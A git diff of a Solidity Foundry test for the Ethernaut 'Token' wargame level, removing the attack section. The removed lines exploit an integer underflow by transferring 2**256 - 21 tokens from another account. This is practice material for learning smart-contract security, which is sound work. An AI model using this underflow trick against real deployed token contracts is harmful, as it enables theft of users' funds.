@@ -33,16 +33,6 @@ contract TokenTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
-        // Change accounts from the level was set up with, have to call the transfer function from a different account
-        vm.startPrank(address(1));
-
-        // Transfer maximum amount of tokens without causing an overflow 
-        ethernautToken.transfer(eoaAddress, (2**256 - 21));
-
-        // Switch back to original account
-        vm.stopPrank();
-        vm.startPrank(eoaAddress);
-
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
